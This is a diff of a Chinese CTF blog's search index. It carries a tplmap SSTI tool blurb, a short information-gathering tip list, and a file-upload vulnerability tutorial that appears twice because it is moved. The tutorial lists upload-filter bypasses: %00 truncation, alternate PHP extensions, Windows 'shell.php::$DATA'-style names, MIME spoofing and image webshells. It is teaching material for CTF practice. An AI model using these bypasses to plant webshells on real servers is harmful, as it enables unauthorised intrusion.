     <content><![CDATA[<h2 id="tplmap-py"><a href="#tplmap-py" class="headerlink" title="tplmap.py"></a>tplmap.py</h2><h3 id="tplmap介绍"><a href="#tplmap介绍" class="headerlink" title="tplmap介绍"></a>tplmap介绍</h3><p>&emsp;&emsp;Tplmap是一个python工具，可以通过使用沙箱转义技术找到代码注入和服务器端模板注入（SSTI）漏洞。该工具能够在许多模板引擎中利用SSTI来访问目标文件或操作系统。一些受支持的模板引擎包括PHP（代码评估），Ruby（代码评估），JaveScript（代码评估），Python（代码评估），ERB，Jinja2和Tornado。该工具可以执行对这些模板引擎的盲注入，并具有执行远程命令的能力。（说的高级吧，其实选用其他博主的(●’◡’●)）实用指数⭐⭐⭐</p>
@@ -567,18 +579,6 @@
       </categories>
       <tags>
         <tag>工具|脚本 利用</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>信息收集（CTF基础篇）</title>
-    <url>/2024/07/18/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%EF%BC%88CTF%E5%9F%BA%E7%A1%80%E7%AF%87%EF%BC%89/</url>
-    <content><![CDATA[<p>&emsp;&emsp;信息收集作为CTF最常用的手段（直接给源码的不算），常规思路有<br><font color=black><br>ctrl+U 查看源代码<br>F12  查看js脚本<br>robots.txt 文件泄露,在URL后面加上&#x2F;robots.txt,可能会给出flag或所在路径<br><a href="http://www.zip/">www.zip</a>   压缩包，同上用法<br>dirsearch   扫描文件，转至<a href="/2024/07/23/dirsearch/">dirsearch</a><br>BurpSuite  抓包找响应头，转至<a href="/2024/07/25/BurpSuite/">BurpSuite</a><br></font><br>&emsp;&emsp;基本思路就这些，剩下的就靠你的搜索能力了( ੭ ˙ᗜ˙ )੭</p>
-]]></content>
-      <categories>
-        <category>WEB</category>
-      </categories>
-      <tags>
-        <tag>基础</tag>
       </tags>
   </entry>
   <entry>
@@ -682,6 +682,47 @@
       </tags>
   </entry>
   <entry>
+    <title>文件上传</title>
+    <url>/2024/07/21/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/</url>
+    <content><![CDATA[<p>&emsp;&emsp;文件上传是利用服务端所提供给你的权力，本意是让你们上传一些有意义的东西，但一些人就从中发现了一些可以利用的漏洞，上传一句话木马进去，这就是典型的文件上传漏洞，靠我们去猜过滤，从而绕过它。那么有以下几种方式的过滤和绕过方法。</p>
+<h3 id="前端检测"><a href="#前端检测" class="headerlink" title="前端检测"></a>前端检测</h3><p>&emsp;&emsp;对于前端的概念就是我们能看到的源码的那种，我们可以打开F12或者ctrl+U找js代码，原理就是前端是客户端还没有向服务器发送任何消息时对<font color=red>本地</font>进行检测来判断是否满足上传的类型。<br>&emsp;&emsp;绕过方法</p>
+<ul>
+<li>删除或者禁用js(JavaScript) 各个浏览器有不同的方式</li>
+<li>使用代理上传文件，用BP抓包修改成符合要求的文件类型，使用方法转至<a href="/2024/07/25/BurpSuite/">BurpSuite</a></li>
+</ul>
+<h3 id="后端检测"><a href="#后端检测" class="headerlink" title="后端检测"></a>后端检测</h3><p>&emsp;&emsp;这种的就不能靠抓包提前去改了，主要是通过黑白名单进行过滤检测。</p>
+<h4 id="白名单绕过"><a href="#白名单绕过" class="headerlink" title="白名单绕过"></a>白名单绕过</h4><h5 id="解析漏洞（黑名单通用）"><a href="#解析漏洞（黑名单通用）" class="headerlink" title="解析漏洞（黑名单通用）"></a>解析漏洞（黑名单通用）</h5><figure class="highlight 1c"><table><tr><td class="code"><pre><span class="line">.htaccess文件解析漏洞   <span class="comment">//重点常考点（有没有老师划重点的那味了- ̗̀(๑ᵔ⌔ᵔ๑)）</span></span><br><span class="line">apache解析漏洞</span><br><span class="line">IIS7.<span class="number">0</span> <span class="string">| IIS7.5 | Nginx的解析漏洞</span></span><br><span class="line">IIS6.<span class="number">0</span>解析漏洞</span><br></pre></td></tr></table></figure>
+<p>&emsp;&emsp;关于这些解析漏洞我就不细讲了，对照相应的搜索一下就可以了，这些漏洞后续也会在对应板块出现。</p>
+<h5 id="截断上传（黑名单通用）"><a href="#截断上传（黑名单通用）" class="headerlink" title="截断上传（黑名单通用）"></a>截断上传（黑名单通用）</h5><ul>
+<li>截断类型:PHP%00截断 (扩展想想还有哪个函数也是这样的)，例如1.php%00</li>
+<li>截断原理:由于00代表结束符,所以会把00后面的所有字符都截断,同理，黑名单也可以用，不过我用得少</li>
+<li>截断条件:PHP版本小于5.3.4,PHP的magic_quotes_gpc为OFF状态</li>
+</ul>
+<h4 id="改后缀"><a href="#改后缀" class="headerlink" title="改后缀"></a>改后缀</h4><p>&emsp;&emsp;将php木马改成满足条件的后缀即可，例如<font color=red>1.php &#x3D;&gt; 1.jpg</font></p>
+<h4 id="黑名单绕过"><a href="#黑名单绕过" class="headerlink" title="黑名单绕过"></a>黑名单绕过</h4><h5 id="特殊的扩展名"><a href="#特殊的扩展名" class="headerlink" title="特殊的扩展名"></a>特殊的扩展名</h5><p>&emsp;&emsp;如果是黑名单的就可以钻空子，看有没有漏网之鱼，例如</p>
+<figure class="highlight makefile"><table><tr><td class="code"><pre><span class="line"><span class="section">比如:</span></span><br><span class="line">asa和cer之类</span><br><span class="line"><span class="section">asp: asa cer aspx</span></span><br><span class="line"><span class="section">jsp: jspx jspf</span></span><br><span class="line"><span class="section">php: php php3 php4 php5 phtml pht (划重点)</span></span><br><span class="line"><span class="section">exe: exee</span></span><br></pre></td></tr></table></figure>
+
+<h5 id="利用windows的命名机制"><a href="#利用windows的命名机制" class="headerlink" title="利用windows的命名机制"></a>利用windows的命名机制</h5><p>&emsp;&emsp;在windows中，后缀名后面的点和空格都会被删除掉。例如</p>
+<figure class="highlight livecodeserver"><table><tr><td class="code"><pre><span class="line"><span class="built_in">shell</span>.php.   <span class="built_in">shell</span>.php空格   <span class="built_in">shell</span>.php:<span class="number">1.</span>jpg   <span class="built_in">shell</span>. php::$DATA   <span class="built_in">shell</span>.php:<span class="number">1.</span>jpg</span><br></pre></td></tr></table></figure>
+
+<h5 id="双写绕过"><a href="#双写绕过" class="headerlink" title="双写绕过"></a>双写绕过</h5><p>&emsp;&emsp;有时候在检测时，后台会把敏感字符替换成空格，这个时候，我们可以使用双写进行绕过。SQL注入同理，，例如:phphpp</p>
+<h5 id="大小写绕过"><a href="#大小写绕过" class="headerlink" title="大小写绕过"></a>大小写绕过</h5><p>&emsp;&emsp;后缀名本质上是不区分大小写滴，例如pHp，但后端检测的时候就说不准了，同理呢，SQL语句过滤也是这样的道理。要举一反三噢ｸﾞｯ!(๑•̀ㅂ•́)و✧</p>
+<h4 id="MIME检测"><a href="#MIME检测" class="headerlink" title="MIME检测"></a>MIME检测</h4><p>&emsp;&emsp;MIME(Multipurpose Internet Mail Extensions)多用途互联网邮件扩展类型。是设定某种扩展名的文件用一种应用程序来打开的方式类型，当该扩展名文件被访问的时候，浏览器会自动使用指定应用程序来打开。用你的BP打开，类似于这些:</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">text/plain （纯文本）</span><br><span class="line">text/html （HTML文档）</span><br><span class="line">text/javascript （js代码）</span><br><span class="line">application/xhtml+xml （XHTML文档）</span><br><span class="line">image/gif （GIF图像）</span><br><span class="line">image/jpeg （JPEG图像）</span><br><span class="line">image/png （PNG图像）</span><br><span class="line">video/mpeg （MPEG动画）</span><br><span class="line">application/octet-stream （二进制数据）</span><br><span class="line">application/pdf （PDF文档）</span><br></pre></td></tr></table></figure>
+<p>&emsp;&emsp;检测方式：在文件上传过程中，服务端会针对我们的上传的文件生成一个数组，这个数组其中有一项就是这个文件的类型file_type；服务端对文件进行检测时，就是通过检测脚本中的黑白名单和这个数组中的file_type进行对比，如果符合要求就允许上传这个文件。绕过方法我们就只要将<font color=red>content-type</font>字段改为常见的允许放行的图片类型,例如<font color=blue>image&#x2F;gif</font>,从而绕过校验。</p>
+<h4 id="文件头绕过"><a href="#文件头绕过" class="headerlink" title="文件头绕过"></a>文件头绕过</h4><p>&emsp;&emsp;我们可以把上面的文件头添加到我们的一句话木马内容最前面，达到绕过文件头检测的目的。比如<br><img data-src="/images/GIF%E6%9C%A8%E9%A9%AC.png" alt="GIF木马"></p>
+<h4 id="内容检测图片马绕过"><a href="#内容检测图片马绕过" class="headerlink" title="内容检测图片马绕过"></a>内容检测图片马绕过</h4><p>&emsp;&emsp;将一句话木马插入到一个合法的图片文件当中，然后用webshell管理工具(蚁剑)连接，当然这边建议你先用phpinfo试一下，一方面有的时候flag就在里面，另一方面能验证是否上传成功。相关文章:<a href="https://blog.csdn.net/weixin_45588247/article/details/119141986">图片马</a></p>
+<h3 id="条件竞争漏洞"><a href="#条件竞争漏洞" class="headerlink" title="条件竞争漏洞"></a>条件竞争漏洞</h3><p>&emsp;&emsp;这个就很高深了，需要熟练使用BP，入门建议先别看。相关文章:<a href="https://blog.csdn.net/weixin_45588247/article/details/118796606?spm=1001.2014.3001.5501">条件竞争</a></p>
+<h3 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h3><p>&emsp;&emsp;文件上传目前常用的就几种，主要我也只会这几种，重点在于多做做题目，推荐题库：<a href="https://www.nssctf.cn/problem">NSSCTF</a>，<a href="https://buuoj.cn/">BUUCTF</a>，<a href="https://ctf.bugku.com/">BugkuCTF</a>,光上面几个就够你试的了，不详细的地方再去搜索一下，要是后续遇到新的方法我也会实时更新的。</p>
+]]></content>
+      <categories>
+        <category>PHP</category>
+      </categories>
+      <tags>
+        <tag>文件上传</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>文件包含</title>
     <url>/2024/07/13/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/</url>
     <content><![CDATA[<p>&emsp;&emsp;通过include或require语句，可以将PHP文件的内容插入另一个PHP文件（在服务器执行它之前）<br>&emsp;&emsp;<strong>include和require语句是相同的，除了错误处理方面</strong></p>
@@ -734,47 +775,6 @@
       </categories>
       <tags>
         <tag>工具|脚本 利用</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>文件上传</title>
-    <url>/2024/07/21/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/</url>
-    <content><![CDATA[<p>&emsp;&emsp;文件上传是利用服务端所提供给你的权力，本意是让你们上传一些有意义的东西，但一些人就从中发现了一些可以利用的漏洞，上传一句话木马进去，这就是典型的文件上传漏洞，靠我们去猜过滤，从而绕过它。那么有以下几种方式的过滤和绕过方法。</p>
-<h3 id="前端检测"><a href="#前端检测" class="headerlink" title="前端检测"></a>前端检测</h3><p>&emsp;&emsp;对于前端的概念就是我们能看到的源码的那种，我们可以打开F12或者ctrl+U找js代码，原理就是前端是客户端还没有向服务器发送任何消息时对<font color=red>本地</font>进行检测来判断是否满足上传的类型。<br>&emsp;&emsp;绕过方法</p>
-<ul>
-<li>删除或者禁用js(JavaScript) 各个浏览器有不同的方式</li>
-<li>使用代理上传文件，用BP抓包修改成符合要求的文件类型，使用方法转至<a href="/2024/07/25/BurpSuite/">BurpSuite</a></li>
-</ul>
-<h3 id="后端检测"><a href="#后端检测" class="headerlink" title="后端检测"></a>后端检测</h3><p>&emsp;&emsp;这种的就不能靠抓包提前去改了，主要是通过黑白名单进行过滤检测。</p>
-<h4 id="白名单绕过"><a href="#白名单绕过" class="headerlink" title="白名单绕过"></a>白名单绕过</h4><h5 id="解析漏洞（黑名单通用）"><a href="#解析漏洞（黑名单通用）" class="headerlink" title="解析漏洞（黑名单通用）"></a>解析漏洞（黑名单通用）</h5><figure class="highlight 1c"><table><tr><td class="code"><pre><span class="line">.htaccess文件解析漏洞   <span class="comment">//重点常考点（有没有老师划重点的那味了- ̗̀(๑ᵔ⌔ᵔ๑)）</span></span><br><span class="line">apache解析漏洞</span><br><span class="line">IIS7.<span class="number">0</span> <span class="string">| IIS7.5 | Nginx的解析漏洞</span></span><br><span class="line">IIS6.<span class="number">0</span>解析漏洞</span><br></pre></td></tr></table></figure>
-<p>&emsp;&emsp;关于这些解析漏洞我就不细讲了，对照相应的搜索一下就可以了，这些漏洞后续也会在对应板块出现。</p>
-<h5 id="截断上传（黑名单通用）"><a href="#截断上传（黑名单通用）" class="headerlink" title="截断上传（黑名单通用）"></a>截断上传（黑名单通用）</h5><ul>
-<li>截断类型:PHP%00截断 (扩展想想还有哪个函数也是这样的)，例如1.php%00</li>
-<li>截断原理:由于00代表结束符,所以会把00后面的所有字符都截断,同理，黑名单也可以用，不过我用得少</li>
-<li>截断条件:PHP版本小于5.3.4,PHP的magic_quotes_gpc为OFF状态</li>
-</ul>
-<h4 id="改后缀"><a href="#改后缀" class="headerlink" title="改后缀"></a>改后缀</h4><p>&emsp;&emsp;将php木马改成满足条件的后缀即可，例如<font color=red>1.php &#x3D;&gt; 1.jpg</font></p>
-<h4 id="黑名单绕过"><a href="#黑名单绕过" class="headerlink" title="黑名单绕过"></a>黑名单绕过</h4><h5 id="特殊的扩展名"><a href="#特殊的扩展名" class="headerlink" title="特殊的扩展名"></a>特殊的扩展名</h5><p>&emsp;&emsp;如果是黑名单的就可以钻空子，看有没有漏网之鱼，例如</p>
-<figure class="highlight makefile"><table><tr><td class="code"><pre><span class="line"><span class="section">比如:</span></span><br><span class="line">asa和cer之类</span><br><span class="line"><span class="section">asp: asa cer aspx</span></span><br><span class="line"><span class="section">jsp: jspx jspf</span></span><br><span class="line"><span class="section">php: php php3 php4 php5 phtml pht (划重点)</span></span><br><span class="line"><span class="section">exe: exee</span></span><br></pre></td></tr></table></figure>
-
-<h5 id="利用windows的命名机制"><a href="#利用windows的命名机制" class="headerlink" title="利用windows的命名机制"></a>利用windows的命名机制</h5><p>&emsp;&emsp;在windows中，后缀名后面的点和空格都会被删除掉。例如</p>
-<figure class="highlight livecodeserver"><table><tr><td class="code"><pre><span class="line"><span class="built_in">shell</span>.php.   <span class="built_in">shell</span>.php空格   <span class="built_in">shell</span>.php:<span class="number">1.</span>jpg   <span class="built_in">shell</span>. php::$DATA   <span class="built_in">shell</span>.php:<span class="number">1.</span>jpg</span><br></pre></td></tr></table></figure>
-
-<h5 id="双写绕过"><a href="#双写绕过" class="headerlink" title="双写绕过"></a>双写绕过</h5><p>&emsp;&emsp;有时候在检测时，后台会把敏感字符替换成空格，这个时候，我们可以使用双写进行绕过。SQL注入同理，，例如:phphpp</p>
-<h5 id="大小写绕过"><a href="#大小写绕过" class="headerlink" title="大小写绕过"></a>大小写绕过</h5><p>&emsp;&emsp;后缀名本质上是不区分大小写滴，例如pHp，但后端检测的时候就说不准了，同理呢，SQL语句过滤也是这样的道理。要举一反三噢ｸﾞｯ!(๑•̀ㅂ•́)و✧</p>
-<h4 id="MIME检测"><a href="#MIME检测" class="headerlink" title="MIME检测"></a>MIME检测</h4><p>&emsp;&emsp;MIME(Multipurpose Internet Mail Extensions)多用途互联网邮件扩展类型。是设定某种扩展名的文件用一种应用程序来打开的方式类型，当该扩展名文件被访问的时候，浏览器会自动使用指定应用程序来打开。用你的BP打开，类似于这些:</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">text/plain （纯文本）</span><br><span class="line">text/html （HTML文档）</span><br><span class="line">text/javascript （js代码）</span><br><span class="line">application/xhtml+xml （XHTML文档）</span><br><span class="line">image/gif （GIF图像）</span><br><span class="line">image/jpeg （JPEG图像）</span><br><span class="line">image/png （PNG图像）</span><br><span class="line">video/mpeg （MPEG动画）</span><br><span class="line">application/octet-stream （二进制数据）</span><br><span class="line">application/pdf （PDF文档）</span><br></pre></td></tr></table></figure>
-<p>&emsp;&emsp;检测方式：在文件上传过程中，服务端会针对我们的上传的文件生成一个数组，这个数组其中有一项就是这个文件的类型file_type；服务端对文件进行检测时，就是通过检测脚本中的黑白名单和这个数组中的file_type进行对比，如果符合要求就允许上传这个文件。绕过方法我们就只要将<font color=red>content-type</font>字段改为常见的允许放行的图片类型,例如<font color=blue>image&#x2F;gif</font>,从而绕过校验。</p>
-<h4 id="文件头绕过"><a href="#文件头绕过" class="headerlink" title="文件头绕过"></a>文件头绕过</h4><p>&emsp;&emsp;我们可以把上面的文件头添加到我们的一句话木马内容最前面，达到绕过文件头检测的目的。比如<br><img data-src="/images/GIF%E6%9C%A8%E9%A9%AC.png" alt="GIF木马"></p>
-<h4 id="内容检测图片马绕过"><a href="#内容检测图片马绕过" class="headerlink" title="内容检测图片马绕过"></a>内容检测图片马绕过</h4><p>&emsp;&emsp;将一句话木马插入到一个合法的图片文件当中，然后用webshell管理工具(蚁剑)连接，当然这边建议你先用phpinfo试一下，一方面有的时候flag就在里面，另一方面能验证是否上传成功。相关文章:<a href="https://blog.csdn.net/weixin_45588247/article/details/119141986">图片马</a></p>
-<h3 id="条件竞争漏洞"><a href="#条件竞争漏洞" class="headerlink" title="条件竞争漏洞"></a>条件竞争漏洞</h3><p>&emsp;&emsp;这个就很高深了，需要熟练使用BP，入门建议先别看。相关文章:<a href="https://blog.csdn.net/weixin_45588247/article/details/118796606?spm=1001.2014.3001.5501">条件竞争</a></p>
-<h3 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h3><p>&emsp;&emsp;文件上传目前常用的就几种，主要我也只会这几种，重点在于多做做题目，推荐题库：<a href="https://www.nssctf.cn/problem">NSSCTF</a>，<a href="https://buuoj.cn/">BUUCTF</a>，<a href="https://ctf.bugku.com/">BugkuCTF</a>,光上面几个就够你试的了，不详细的地方再去搜索一下，要是后续遇到新的方法我也会实时更新的。</p>
-]]></content>
-      <categories>
-        <category>PHP</category>
-      </categories>
-      <tags>
-        <tag>文件上传</tag>
       </tags>
   </entry>
 </search>
